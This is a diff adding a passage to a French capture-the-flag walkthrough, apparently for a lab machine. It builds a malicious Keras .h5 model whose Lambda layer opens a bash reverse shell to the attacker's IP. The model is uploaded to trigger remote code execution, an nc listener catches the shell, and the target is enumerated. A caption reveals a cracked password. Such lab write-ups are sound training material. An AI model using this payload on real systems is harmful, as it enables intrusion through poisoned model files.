@@ -766,6 +766,118 @@ La réception de ces paquets ICMP confirme que :
 - le modèle `.h5` est bien chargé par le serveur
 - le code `ping` est exécuté côté cible
 
+### Exploitation : reverse-shell.h5
+
+Une fois la RCE confirmée avec `poc-ping.h5`, tu peux passer à l’étape suivante : obtenir un accès distant sur la machine cible.
+
+L’objectif est de remplacer la commande `ping` par un reverse shell, afin que la cible initie une connexion vers ta machine Kali.
+
+#### Création de reverse-shell.py
+
+Tu reprends le principe utilisé précédemment et tu crées un nouveau script :
+
+```bash
+nano reverse-shell.py
+```
+
+Tu ajoutes le code suivant, en remplaçant `10.10.x.x` par l’adresse IP `tun0` de ta machine Kali :
+
+```python
+import tensorflow as tf
+from tensorflow import keras
+from tensorflow.keras import layers
+
+def payload(x):
+    import os
+    os.system("bash -c 'bash -i >& /dev/tcp/10.10.x.x/4444 0>&1'")
+    return x
+
+model = keras.Sequential([
+    layers.Input(shape=(1,)),
+    layers.Lambda(payload)
+])
+
+model.save("reverse-shell.h5")
+```
+
+
+
+> **Note :** En cas de redémarrage ou de reset de la machine cible, l’image Docker est généralement déjà présente sur ton Kali.  
+> Il n’est donc pas nécessaire de la reconstruire : un simple `docker run` suffit pour relancer l’environnement de travail.
+
+
+
+Tu génères ensuite le fichier `.h5` :
+
+```bash
+bashpython3 reverse-shell.py
+ls -lh reverse-shell.h5
+```
+
+#### Reverse Shell
+
+Sur ta machine Kali, tu démarres un listener :
+
+```bash
+nc -lnvp 4444
+```
+
+Depuis l’interface web, tu uploades le fichier `reverse-shell.h5` via le bouton `Browse` et `Upload Model`, puis tu cliques sur `View Predictions` afin de déclencher son exécution.
+
+Si tout se passe correctement, une connexion entrante apparaît dans ton listener : le reverse shell est établi sur ta machine Kali.
+
+```bash
+app@artificial:~/app$ whoami
+whoami
+app
+app@artificial:~/app$ id
+id
+uid=1001(app) gid=1001(app) groups=1001(app)
+app@artificial:~/app$ pwd
+pwd
+/home/app/app
+app@artificial:~/app$
+```
+
+Une fois le reverse shell obtenu, tu peux le stabiliser en appliquant la recette {{< recette "stabiliser-reverse-shell" >}}
+
+### Exploitation du reverse shell
+
+Une fois le reverse shell établi et stabilisé, tu peux commencer l’exploration de la machine cible.
+
+Tu vérifies d’abord l’utilisateur courant :
+
+```bash
+whoami
+id
+
+```
+
+Cela permet de confirmer le contexte d’exécution du code.
+
+Tu peux ensuite lancer une première énumération simple du système :
+
+```bash
+pwd
+ls -la
+uname -a
+```
+
+L’objectif est d’identifier rapidement :
+- l’environnement utilisateur
+- les fichiers accessibles
+- les éventuels points d’entrée pour une escalade de privilèges
+
+Cette phase marque le début de l’analyse post-exploitation.
+
+
+
+
+
+![Interface CrackStation montrant le déchiffrement du hash MD5 de l’utilisateur gael révélant le mot de passe mattp005numbertwo](gael-crackstation.png)
+
+
+
 
 
 
